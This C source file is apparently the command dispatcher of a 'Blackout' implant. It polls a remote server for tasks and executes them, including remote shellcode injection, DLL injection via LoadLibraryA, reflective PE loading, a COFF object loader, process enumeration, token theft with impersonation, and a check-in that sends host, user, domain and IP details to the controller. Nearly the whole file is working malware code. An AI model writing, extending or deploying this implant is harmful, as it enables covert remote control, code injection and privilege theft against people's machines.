#include <common.h>
#include <evasion.h>

FUNC VOID CommandDispatcher(
    void
) {
    BLACKOUT_INSTANCE

    Instance()->Commands[ 0  ] = { .ID = BLACKOUT_CHECKIN, .Function = CmdCheckin };
    Instance()->Commands[ 1  ] = { .ID = COMMAND_MEMORY,   .Function = CmdMemory };
    Instance()->Commands[ 2  ] = { .ID = COMMAND_RUN,      .Function = CmdRun };
    Instance()->Commands[ 3  ] = { .ID = COMMAND_EXPLORER, .Function = CmdExplorer };
    Instance()->Commands[ 4  ] = { .ID = COMMAND_SLEEP,    .Function = CmdSleep };
    Instance()->Commands[ 5  ] = { .ID = COMMAND_EXITP,    .Function = CmdExitProcess };
    Instance()->Commands[ 6  ] = { .ID = COMMAND_EXITT,    .Function = CmdExitThread };
    Instance()->Commands[ 7  ] = { .ID = COMMAND_CLASSIC,  .Function = CmdInjectionClassic };
    Instance()->Commands[ 8  ] = { .ID = COMMAND_PROCLIST, .Function = CmdProcEnum };
    Instance()->Commands[ 9  ] = { .ID = CMD_COFFLOADER,   .Function = CmdCoffLoader };
    Instance()->Commands[ 10 ] = { .ID = CMD_DLLINJECTION, .Function = CmdDllInjection }; 
    Instance()->Commands[ 11 ] = { .ID = CMD_REFLECTION,   .Function = CmdReflectiveInjection };

    PPACKAGE Package     = NULL;
    PARSER   Parser      = { 0 };
    PVOID    DataBuffer  = NULL;
    SIZE_T   DataSize    = 0;
    DWORD    TaskCommand = 0;

    BK_PRINT( "Command Dispatcher...\n" );

    do
    {
        if ( !Instance()->Session.Connected )
            return;

        SleepMain( Instance()->Session.SleepTime * 1000 );
        Package = PackageCreate( COMMAND_GET_JOB );
        PackageAddInt32( Package, Instance()->Session.AgentId );
        PackageTransmit( Package, &DataBuffer, &DataSize );

        if ( DataBuffer && DataSize > 0 ) {
            ParserNew( &Parser, DataBuffer, DataSize );
            do
            {   
                TaskCommand = ParserGetInt32( &Parser );
                if ( TaskCommand != COMMAND_NO_JOB )
                {
                    BK_PRINT( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );

                    BOOL FoundCommand = FALSE;
                    for ( UINT32 FunctionCounter = 0; FunctionCounter < BLACKOUT_COMMAND_LENGTH; FunctionCounter++ )
                    {
                        BK_PRINT( "Task => CommandID:[%lu : %lu]\n", TaskCommand, Instance()->Commands[ FunctionCounter ].ID );
                        if ( Instance()->Commands[ FunctionCounter ].ID == TaskCommand )
                        {
                            Instance()->Commands[ FunctionCounter ].Function( &Parser );
                            FoundCommand = TRUE;
                            break;
                        }
                    }

                    if ( ! FoundCommand )
                        BK_PRINT( "Command not found !!\n" );

                } else BK_PRINT( "Is COMMAND_NO_JOB\n" );

            } while ( Parser.Length > 4 );

            Instance()->Win32.LocalFree( DataBuffer );
            DataBuffer = NULL;

            ParserDestroy( &Parser );
        }
        else
        {
            BK_PRINT( "Transport: Failed\n" );
            break;
        }

    } while ( TRUE );

    Instance()->Win32.LocalFree( DataBuffer );
    Instance()->Session.Connected = FALSE;
}

FUNC VOID CmdInjectionClassic(
    PPARSER Parser
) {
    BK_PACKAGE = PackageCreate( COMMAND_CLASSIC );

    DWORD  bkErrorCode = 0;
    HANDLE ProcessHandle  = NULL;
    DWORD  ProcessId      = ParserGetInt32( Parser );
    DWORD  RegionSize     = 0;
    PVOID  MemAllocated   = NULL;
    PBYTE  ShellcodeBytes = ParserGetBytes( Parser, &RegionSize );
    DWORD  ThreadId       = 0;
    HANDLE ThreadHandle   = NULL;

    bkErrorCode = bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
    if ( bkErrorCode != 0 ) 
       goto _Leave;

    bkErrorCode = bkMemAlloc( ProcessHandle, &MemAllocated, RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( bkErrorCode != 0 ) 
       goto _Leave;

    bkErrorCode = bkMemWrite( ProcessHandle, MemAllocated, ShellcodeBytes, RegionSize );
    if ( bkErrorCode != 0 ) 
       goto _Leave;

    bkErrorCode = bkMemProtect( ProcessHandle, MemAllocated, RegionSize, PAGE_EXECUTE_READ );
    if ( bkErrorCode != 0 )
       goto _Leave;

    bkErrorCode = bkThreadCreate( ProcessHandle, MemAllocated, NULL, NULL, NULL, &ThreadId, &ThreadHandle );
    if ( bkErrorCode != 0 )
       goto _Leave;

_Leave:
    if ( ThreadHandle  ) bkHandleClose( ThreadHandle  );
    if ( ProcessHandle ) bkHandleClose( ProcessHandle );
    if ( bkErrorCode != 0 ) {
        PackageTransmitError( bkErrorCode ); return;
    }

    PackageAddInt32( BK_PACKAGE, ProcessId );
    PackageAddInt32( BK_PACKAGE, ThreadId );
    PackageAddInt64( BK_PACKAGE, U_64( MemAllocated ) );
    PackageAddInt32( BK_PACKAGE, RegionSize );
    PackageTransmit( BK_PACKAGE, NULL, NULL );    
}

FUNC VOID CmdMemory(
    _In_ PPARSER Parser
) {    
    M_MEM MemOp = ParserGetInt32( Parser );
    BK_PACKAGE  = PackageCreate( COMMAND_MEMORY );
    DWORD bkErrorCode   = 0;

    switch ( MemOp ) {
        case ALLOC: {
            HANDLE ProcessHandle = ParserGetInt32( Parser );
            PVOID  BaseAddr      = ParserGetInt32( Parser );
            UINT64 RegionSize    = ParserGetInt64( Parser );
            DWORD  Protection    = ParserGetInt32( Parser );

            bkErrorCode = bkMemAlloc( ProcessHandle, &BaseAddr, RegionSize, 0x3000, Protection );
            if (bkErrorCode != 0) {
                PackageTransmitError(bkErrorCode);
                return;
            }

            PackageAddInt64( BK_PACKAGE, U_64( BaseAddr ) );
            PackageTransmit( BK_PACKAGE, NULL, NULL );
        }
        
        case WRITE: {
            HANDLE ProcessHandle = ParserGetInt32( Parser );
            PVOID  MemBaseAddr   = ParserGetInt64( Parser );
            UINT32 BufferSize    = 0;
            PBYTE  Buffer        = ParserGetBytes( Parser, &BufferSize );

            bkErrorCode = bkMemWrite( ProcessHandle, MemBaseAddr, Buffer, BufferSize );
            if (bkErrorCode != 0) {
                PackageTransmitError( bkErrorCode );
                return;
            }

            PackageTransmit( BK_PACKAGE, NULL, NULL );
        }

        default:
            PackageTransmitError( ERROR_INVALID_OPERATION );
            return;
    }
}

FUNC VOID CmdRun(
    _In_ PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( COMMAND_RUN );
    PSTR     ProcCmd       = ParserGetString( Parser, NULL );
    DWORD    ProcessId     = 0;
    DWORD    ThreadId      = 0;
    HANDLE   ProcessHandle = NULL;
    HANDLE   ThreadHandle  = NULL;
    BOOL     bCheck        = FALSE;

    Blackout().Fork.Blockdlls = TRUE;

    bCheck = bkProcessCreate( ProcCmd, FALSE, CREATE_NEW_CONSOLE, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
    if ( !bCheck )
        return;

    PackageAddBool(  BK_PACKAGE, bCheck     );
    PackageAddInt32( BK_PACKAGE, ProcessId  );
    PackageAddInt32( BK_PACKAGE, ThreadId   );
    PackageTransmit( BK_PACKAGE, NULL, NULL );
}

FUNC VOID CmdExplorer(
    _In_ PPARSER Parser
) {
    BLACKOUT_INSTANCE

    M_EXPLR Explorer = ParserGetInt32( Parser );
    BOOL    bCheck   = FALSE;

    BK_PACKAGE = PackageCreate( COMMAND_EXPLORER );
    
    switch ( Explorer )
    {
    case CD: {
        PSTR DestDir = ParserGetString( Parser, NULL ); 
        bCheck = Instance()->Win32.SetCurrentDirectoryA( DestDir );
        if ( bCheck )
            PackageTransmitError( NtLastError() );

        PackageAddInt32( BK_PACKAGE, CD );
        PackageTransmit( BK_PACKAGE, NULL, NULL );
    }
    case PWD: {
        CHAR CurDir[MAX_PATH];
        bCheck = Instance()->Win32.GetCurrentDirectoryA( MAX_PATH, CurDir );
        if ( !bCheck )
            PackageTransmitError( NtLastError() );
        
        PackageAddInt32(  BK_PACKAGE, PWD );
        PackageAddString( BK_PACKAGE, CurDir );
        PackageTransmit(  BK_PACKAGE, NULL, NULL );
    }
    
    default:
        break;
    }
}

FUNC VOID CmdReflectiveInjection(
    PPARSER Parser
) {
    UINT32 PeSize  = 0;
    PBYTE  PeBytes = ParserGetBytes( Parser, &PeSize );
    PSTR   PeArgs  = ParserGetString( Parser, 0 );

    InjectionReflective( NtCurrentProcess(), PeBytes, PeSize, PeArgs, TRUE );
}

FUNC VOID CmdDllInjection(
    PPARSER Parser
) {
    BLACKOUT_INSTANCE
    
    UINT32 ProcessId = ParserGetInt32( Parser );
    PSTR   DllPath   = ParserGetString( Parser, 0 );
    
    HANDLE ProcessHandle = NULL;
    HANDLE ThreadHandle  = NULL;
    UINT32 bkErrorCode   = 0;
    PVOID  MemoryAlloc   = NULL;

    BK_PRINT( "proc id %d dllpath %s\n", ProcessId, DllPath );

    if ( ProcessId != 0 ) {
        bkErrorCode = bkProcessOpen( PROCESS_ALL_ACCESS, FALSE, ProcessId, &ProcessHandle );
        if ( bkErrorCode != 0 ) goto _Leave;
    }

    bkErrorCode = bkMemAlloc( ProcessHandle, &MemoryAlloc, StringLengthA( DllPath ), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( bkErrorCode != 0 ) goto _Leave;

    bkErrorCode = bkMemWrite( ProcessHandle, MemoryAlloc, DllPath, StringLengthA( DllPath ) );
    if ( bkErrorCode != 0 ) goto _Leave;

    bkErrorCode = bkThreadCreate( ProcessHandle, Instance()->Win32.LoadLibraryA, MemoryAlloc, 0, 0, 0, &ThreadHandle );
    if ( bkErrorCode != 0 ) goto _Leave;

_Leave:
    if ( ProcessHandle ) bkHandleClose( ProcessHandle );

    BK_PRINT( "%d %x\n", bkErrorCode, bkErrorCode );
}

FUNC VOID CmdCoffLoader(
    PPARSER Parser
) {
    UINT32 ObjectSize = 0;
    PBYTE  ObjectAddr = ParserGetBytes( Parser, &ObjectSize );
    //PSTR   Args       = ParserGetString( Parser, NULL );

    BK_PRINT( "coff @ 0x%p [%d bytes]\n", ObjectAddr, ObjectSize );

    CoffLdr( ObjectAddr, "go", 0, 0 );

    return;
}

FUNC VOID CmdProcEnum(
    _In_ PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( COMMAND_PROCLIST );

    DWORD  bkErrorCode         = 0;
    DWORD  ReturnLen1  = 0;
    PVOID  ValToFree   = NULL;
    PSTR   UserBuff    = 0;
    DWORD  UserBuffLen = 0;
    HANDLE TokenHandle = NULL;

    PSYSTEM_PROCESS_INFORMATION        Spi = { 0 };
    PROCESS_EXTENDED_BASIC_INFORMATION Ebi = { 0 };

    MmZero( &Ebi, sizeof( PROCESS_EXTENDED_BASIC_INFORMATION ) );

    Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen1 );

    Spi = bkHeapAlloc( ReturnLen1 );

    ValToFree = Spi;

    bkErrorCode = Instance()->Win32.NtQuerySystemInformation( SystemProcessInformation, Spi, ReturnLen1, &ReturnLen1 );
    if ( bkErrorCode != STATUS_SUCCESS ) {
        PackageTransmitError( bkErrorCode );
        return;
    }


    Spi = (PSYSTEM_PROCESS_INFORMATION)( U_PTR(Spi) + Spi->NextEntryOffset );        

    while ( 1 ) {

        if ( !Spi->NextEntryOffset )
            break;

        bkTokenOpen( LongToHandle( Spi->UniqueProcessId ), TOKEN_QUERY, &TokenHandle, 0x01 );

        GetTokenUserA( TokenHandle, &UserBuff, &UserBuffLen );

        bkErrorCode = Instance()->Win32.NtQueryInformationProcess( 
            UlongToHandle( Spi->UniqueProcessId ), ProcessBasicInformation,
            &Ebi, sizeof( PROCESS_EXTENDED_BASIC_INFORMATION ), NULL 
        ); 

        PackageAddBytes(  BK_PACKAGE, B_PTR( Spi->ImageName.Buffer ), Spi->ImageName.Length );
        PackageAddInt32(  BK_PACKAGE, HandleToULong( Spi->UniqueProcessId ) );
        PackageAddInt32(  BK_PACKAGE, HandleToULong( Spi->InheritedFromUniqueProcessId ) );
        PackageAddString( BK_PACKAGE, UserBuff );
        PackageAddInt32(  BK_PACKAGE, Spi->NumberOfThreads );
        PackageAddInt32(  BK_PACKAGE, Ebi.IsProtectedProcess );
        PackageAddInt32(  BK_PACKAGE, Ebi.IsWow64Process );

        bkHeapFree( UserBuff, UserBuffLen );

        Spi = (PSYSTEM_PROCESS_INFORMATION)( U_PTR(Spi) + Spi->NextEntryOffset );        
    }

    bkHeapFree( ValToFree, ReturnLen1 );

    PackageTransmit( BK_PACKAGE, NULL, NULL );
}

FUNC VOID CmdCheckin(
    _In_ PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( BLACKOUT_CHECKIN );

    PackageAddInt64( BK_PACKAGE, Blackout().Region.Base      );
    PackageAddInt64( BK_PACKAGE, Blackout().Region.Length    );
    PackageAddInt64( BK_PACKAGE, Blackout().RxRegion.Base    );
    PackageAddInt64( BK_PACKAGE, Blackout().RxRegion.Length  );

    PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessName     );
    PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessFullPath );
    PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessCmdLine  );
    PackageAddInt32(   BK_PACKAGE, Instance()->Session.ProcessId       );
    PackageAddInt32(   BK_PACKAGE, Instance()->Session.ParentProcId    );
    PackageAddBool(    BK_PACKAGE, Instance()->Session.Protected       );

    PackageAddString( BK_PACKAGE, Instance()->System.UserName      );
    PackageAddString( BK_PACKAGE, Instance()->System.ComputerName  );
    PackageAddString( BK_PACKAGE, Instance()->System.DomainName    );
    PackageAddString( BK_PACKAGE, Instance()->System.NetBios       );
    PackageAddString( BK_PACKAGE, Instance()->System.IpAddress     );
    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsArch        );
    PackageAddInt32(  BK_PACKAGE, Instance()->System.ProductType   );
    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsMajorV      );
    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsMinorv      );
    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsBuildNumber );

    PackageAddWString( BK_PACKAGE, Transport().Http.Host      );
    PackageAddInt32(   BK_PACKAGE, Transport().Http.Port      );
    PackageAddWString( BK_PACKAGE, Transport().Http.UserAgent );

    PackageTransmit( BK_PACKAGE, NULL, NULL );
}

FUNC VOID CommandToken(
    PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE     = PackageCreate( COMMAND_TOKEN );
    M_TOKEN mToken = ParserGetInt32( Parser );

    switch ( mToken ) {
        case UID: {
            PSTR  UserProcToken     = NULL;
            DWORD UserProcTokenLen  = 0;

            PSTR  UserThreadToken    = NULL;
            DWORD UserThreadTokenLen = 0;

            GetTokenUserA( NtCurrentProcessToken(), &UserProcToken, &UserProcTokenLen );
            GetTokenUserA( NtCurrentProcessToken(), &UserThreadToken, &UserThreadTokenLen );

            PackageAddString( BK_PACKAGE, UserProcToken );
            PackageAddString( BK_PACKAGE, UserThreadToken );
            PackageTransmit( BK_PACKAGE, NULL, NULL );

            bkHeapFree( UserProcToken, UserProcTokenLen );
            bkHeapFree( UserThreadToken, UserThreadTokenLen );  
        }
        case STEAL: {
            DWORD  ProcessId    = ParserGetInt32( Parser );
            HANDLE TokenHandle  = NULL;
            BOOL   bCheck       = FALSE;
            PSTR   UserToken    = NULL;
            DWORD  UserTokenLen = 0;
             
            bCheck = TokenSteal( ProcessId, &TokenHandle );
            if ( !bCheck ) {
                PackageTransmitError( NtLastError() ); return;
            }

            bCheck = Instance()->Win32.ImpersonateLoggedOnUser( TokenHandle );
            if ( !bCheck ) {
                PackageTransmitError( NtLastError() ); return;
            }

            bkHandleClose( TokenHandle );
    
            TokenHandle = NtCurrentProcessToken();

            GetTokenUserA( TokenHandle, &UserToken, &UserTokenLen );

            PackageAddString( BK_PACKAGE, UserToken );
            PackageTransmit( BK_PACKAGE, NULL, NULL );

        __Leave:
            if ( TokenHandle ) bkHandleClose( TokenHandle );
            if ( UserToken   ) bkHeapFree( UserToken, UserTokenLen );
        }
    
        default:
        break;
    }

}

FUNC VOID CmdSleep(
    PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( COMMAND_SLEEP );

    DWORD SleepTime = ParserGetInt32( Parser );

    Instance()->Session.SleepTime = SleepTime;

    PackageAddInt32( BK_PACKAGE, SleepTime );
    PackageTransmit( BK_PACKAGE, NULL, NULL ); 
}

FUNC VOID CmdExitProcess(
    PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( COMMAND_EXITP );

    Instance()->Win32.RtlExitUserProcess( 0 );
}

FUNC VOID CmdExitThread(
    PPARSER Parser
) {
    BLACKOUT_INSTANCE

    BK_PACKAGE = PackageCreate( COMMAND_EXITT );

    Instance()->Win32.RtlExitUserThread( 0 );
}